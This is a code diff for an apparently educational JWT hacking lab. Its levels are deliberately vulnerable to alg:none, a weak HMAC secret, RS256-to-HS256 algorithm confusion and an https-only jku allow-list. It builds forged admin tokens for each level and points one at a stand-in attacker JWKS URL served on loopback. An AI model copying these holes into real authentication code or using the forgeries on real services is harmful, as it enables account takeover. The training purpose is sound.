@@ -1,40 +1,50 @@
-import {
-  createHmac,
-  generateKeyPairSync,
-  randomBytes,
-  sign as rsaSign,
-  timingSafeEqual,
-  verify as rsaVerify,
-} from "node:crypto";
+import { createHmac, timingSafeEqual, verify as rsaVerify } from "node:crypto";
 import { createServer as createHttpServer, get as httpGet } from "node:http";
 import type { IncomingMessage, Server, ServerResponse } from "node:http";
 import type { AttackResult, LabInput, Level, LootItem, RealLab } from "./runner.js";
 
 /**
- * Real JWT lab: genuine RS256 (real RSA keypair via node:crypto) and HS256
+ * Real JWT lab: genuine RS256 (fixed public RSA-2048 lab key, node:crypto) and HS256
  * (real HMAC-SHA256, timing-safe compare) verification, a real alg:none
  * bypass, real RS256→HS256 algorithm confusion (the RSA public key's own PEM
- * bytes used as the HMAC secret), and a jku key lookup served by a real
- * loopback HTTP helper (127.0.0.1, ephemeral port) that stands in for an
- * attacker-reachable JWKS endpoint — no real network is ever used.
+ * bytes used as the HMAC secret), and a jku key lookup for the same attacker
+ * JWKS URL/key the simulated lab uses, served by a real loopback HTTP helper
+ * (127.0.0.1, ephemeral port) — no real DNS/outbound network is ever used.
  * Objective: forge a token with role=admin that the current level accepts.
  */
 
 const KID = "key-2026";
-const EVIL_KID = "evil-1";
+const EVIL_KID = "evil";
+/** The attacker-controlled JWKS URL (same constant as the simulated lab). */
+export const ATTACKER_JKU = "https://evil.example/jwks.json";
 
-const { publicKey: RSA_PUBLIC_PEM, privateKey: RSA_PRIVATE_PEM } = generateKeyPairSync("rsa", {
-  modulusLength: 2048,
-  publicKeyEncoding: { type: "spki", format: "pem" },
-  privateKeyEncoding: { type: "pkcs8", format: "pem" },
-});
+/**
+ * Fixed public lab key (RSA-2048). Only the public half exists in the source:
+ * the one legitimately signed token (alice, role=user) is pre-signed below.
+ */
+export const RSA_PUBLIC_PEM = [
+  "-----BEGIN PUBLIC KEY-----",
+  "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA35B5W7e7TIIXNiguR87u",
+  "hhTVS8SzHWaGz7onGWyFBXtFr087gv/OMNpoLC/JXSU3kNwmuznpATaFFCeQokiF",
+  "paOtnajGB5xxfT/IL6x/GrUX5PP3eE2OkvPVwJCgvp20kXoAVaSXSkPPKFwbem1R",
+  "EpRGKP2+Jf4hBN8yXoUtPEoGTORQ+aQQArunFnWNKFuhcmoDaPGu/i9i6GORZ9Qu",
+  "Ur625rG9wbkgcoia39MXi56PYowUR9CjdfdjEVH0PGj/VdZ2oQWapRqZWLEsLDCr",
+  "nIrT+F/efOvpZ/hDIUEsxjA8S2EU0tSkBarJSXRCHh9+UVH2UsYLQceDBi9L+Kez",
+  "XwIDAQAB",
+  "-----END PUBLIC KEY-----",
+  "",
+].join("\n");
+
+/** RS256 signature of the benign alice/user token, made offline with the (discarded) private key. */
+const BENIGN_SIGNATURE =
+  "qdcm-hrZE-a5gc3BfPDYvGLhU3WrZj6bVvCGJzGeGGqpXq4HM9RhvyahCL8yskgfziC_FRsfF0iNofC9mjEi_ql_77FJbFN2PUOLsB5CVvOJ640Z5fBFGd4688bcZNqU5hoViMx0ffN3ba3I2Ok6KOVBptNuX3SrUApHobRTAXgmCtLIZSierRzaRO697a7w3pjAC0BoeBX3N6Bc3nsdHAgmHYSaLxWVO2tA0GpHVAZWdmjgJ-g036kVuByGqWkyOaph7_rkLUuV7xS7Y4sEu2me00SMV-486dn2lpy5ZpWq2dlGLPckNxvF-Sh3I4DAFp3aNTluk4TEYCiqtkY0Ug";
 
 /** Lv2's crackable shared secret. */
 const WEAK_SECRET = Buffer.from("secret", "utf8");
 /** Lv3's algorithm-confusion key: the RS256 public key used verbatim as an HMAC secret. */
 const CONFUSION_SECRET = Buffer.from(RSA_PUBLIC_PEM, "utf8");
-/** Lv4's attacker-planted oct key, served only from the loopback JWKS helper below. */
-const EVIL_HMAC_KEY = randomBytes(32);
+/** Lv4's attacker-planted oct key, served only by the in-process JWKS helper below. */
+const EVIL_HMAC_KEY = Buffer.from("evil-hmac-key", "utf8");
 
 function b64url(buf: Buffer): string {
   return buf.toString("base64url");
@@ -51,12 +61,6 @@ function decodePart(part: string): Record<string, unknown> | null {
   } catch {
     return null;
   }
-}
-
-function signRS256(header: Record<string, unknown>, payload: Record<string, unknown>): string {
-  const data = `${encodePart(header)}.${encodePart(payload)}`;
-  const sig = rsaSign("RSA-SHA256", Buffer.from(data), RSA_PRIVATE_PEM);
-  return `${data}.${b64url(sig)}`;
 }
 
 function signHS256(header: Record<string, unknown>, payload: Record<string, unknown>, secret: Buffer): string {
@@ -128,6 +132,7 @@ function getJwksHelper(): Promise<JwksHelper> {
 
 interface JwksFetch {
   ok: boolean;
+  raw?: string;
   keys?: { kty?: string; kid?: string; k?: string }[];
   error?: string;
 }
@@ -143,12 +148,13 @@ function fetchJson(url: string): Promise<JwksFetch> {
           return;
         }
         try {
-          const parsed: unknown = JSON.parse(Buffer.concat(chunks).toString("utf8"));
+          const raw = Buffer.concat(chunks).toString("utf8");
+          const parsed: unknown = JSON.parse(raw);
           const keys =
             typeof parsed === "object" && parsed !== null && Array.isArray((parsed as { keys?: unknown }).keys)
               ? ((parsed as { keys: unknown[] }).keys as { kty?: string; kid?: string; k?: string }[])
               : [];
-          resolve({ ok: true, keys });
+          resolve({ ok: true, raw, keys });
         } catch {
           resolve({ ok: false, error: "invalid JSON" });
         }
@@ -165,29 +171,36 @@ interface JkuResolution {
 }
 
 /**
- * Lv4's vulnerable key resolution: the allow-list only checks that the jku is
- * under the (loopback) trusted host prefix, not which specific document it
- * points to — a real, documented jku bypass pattern. A hard safety net keeps
- * every fetch on 127.0.0.1 regardless, so no real outbound request can occur.
+ * In-process "DNS": the only names the lab can resolve, each mapped to a
+ * document on the loopback helper. Anything else is simply unreachable, so no
+ * real DNS lookup or outbound request ever happens.
+ */
+const JKU_RESOLVER = new Map<string, string>([[ATTACKER_JKU, EVIL_KID]]);
+
+/**
+ * Lv4's vulnerable key resolution: the jku allow-list only checks the scheme
+ * (https://), so any host/path the token names is trusted — and here an
+ * attacker-controlled JWKS is "reachable". The fetch itself goes to the
+ * loopback helper, never to the named host.
  */
 async function resolveJkuHmacKey(jku: string, kid: string | undefined): Promise<JkuResolution> {
-  if (!jku.startsWith("http://127.0.0.1:")) {
-    return { key: null, line: `jku fetch blocked: ${jku} はループバック URL ではありません` };
+  if (!jku.startsWith("https://")) {
+    return { key: null, line: `jku fetch blocked: ${jku} は https:// ではありません` };
+  }
+  const doc = JKU_RESOLVER.get(jku);
+  if (doc === undefined) {
+    return { key: null, line: `JWKS fetch failed: ${jku}` };
   }
   const helper = await getJwksHelper();
-  if (!jku.startsWith(helper.base)) {
-    return { key: null, line: `jku fetch blocked: ${jku} は信頼済みプレフィックス ${helper.base} 外です` };
-  }
-  const res = await fetchJson(jku);
+  const res = await fetchJson(`${helper.base}${doc}.json`);
   if (!res.ok || !res.keys) {
-    return { key: null, line: `JWKS fetch failed: ${jku} (${res.error ?? "no keys"})` };
+    return { key: null, line: `JWKS fetch failed: ${jku}` };
   }
   const match = res.keys.find((k) => k.kty === "oct" && (kid === undefined || k.kid === kid)) ?? res.keys.find((k) => k.kty === "oct");
   if (!match?.k) {
-    return { key: null, line: `JWKS ${jku} に oct 鍵が見つかりません` };
+    return { key: null, line: `JWKS ${jku} : ${res.raw}` };
   }
-  const key = Buffer.from(match.k, "base64url");
-  return { key, line: `JWKS ${jku} : oct kid=${match.kid ?? "?"} (${key.length * 8} bit)` };
+  return { key: Buffer.from(match.k, "base64url"), line: `JWKS ${jku} : ${res.raw}` };
 }
 
 function describeMechanism(level: Level, alg: string, accepted: boolean): string {
@@ -221,6 +234,10 @@ async function run(level: Level, input: LabInput): Promise<AttackResult> {
   let reason: string;
   let jwksLine: string | null = null;
   let foundJwks = false;
+  const wellKnownLines =
+    level >= 3
+      ? ["GET /.well-known/jwks-public.pem", ...RSA_PUBLIC_PEM.trimEnd().split("\n")]
+      : [];
 
   if (level === 1) {
     if (alg === "none") {
@@ -299,7 +316,7 @@ async function run(level: Level, input: LabInput): Promise<AttackResult> {
   const benign = !accepted && isAliceUser && sigValid;
   const progress = !accepted && !isAliceUser && foundJwks;
   const loot: LootItem[] | undefined = foundJwks
-    ? [{ id: "jwt-oct", label: "JWKS oct 鍵 (hex)", value: EVIL_HMAC_KEY.toString("hex") }]
+    ? [{ id: "jwt-oct", label: "JWKS oct 鍵 (decoded)", value: EVIL_HMAC_KEY.toString("utf8") }]
     : undefined;
 
   const recap = accepted
@@ -317,6 +334,7 @@ async function run(level: Level, input: LabInput): Promise<AttackResult> {
     output: [
       `header : ${JSON.stringify(header)}`,
       `payload: ${JSON.stringify(payload)}`,
+      ...wellKnownLines,
       ...(jwksLine ? [jwksLine] : []),
       accepted
         ? `[200 OK] /admin — ${String(payload.sub)} (admin)`
@@ -336,22 +354,21 @@ async function run(level: Level, input: LabInput): Promise<AttackResult> {
 }
 
 /** Builds real tokens for each Lv1-4 exploit, plus the benign default token, for tests. */
-export async function buildJwtExploitTokens(): Promise<{
+export function buildJwtExploitTokens(): {
   benign: string;
   none: string;
   weakHmac: string;
   confusion: string;
   jku: string;
-}> {
+} {
   const admin = { sub: "attacker", role: "admin" };
   const user = { sub: "alice", role: "user" };
-  const helper = await getJwksHelper();
   return {
-    benign: signRS256({ alg: "RS256", typ: "JWT", kid: KID }, user),
+    benign: `${encodePart({ alg: "RS256", typ: "JWT", kid: KID })}.${encodePart(user)}.${BENIGN_SIGNATURE}`,
     none: makeNoneToken({ alg: "none", typ: "JWT" }, admin),
     weakHmac: signHS256({ alg: "HS256", typ: "JWT" }, admin, WEAK_SECRET),
     confusion: signHS256({ alg: "HS256", typ: "JWT" }, admin, CONFUSION_SECRET),
-    jku: signHS256({ alg: "HS256", typ: "JWT", jku: `${helper.base}${EVIL_KID}.json`, kid: EVIL_KID }, admin, EVIL_HMAC_KEY),
+    jku: signHS256({ alg: "HS256", typ: "JWT", jku: ATTACKER_JKU, kid: EVIL_KID }, admin, EVIL_HMAC_KEY),
   };
 }
 
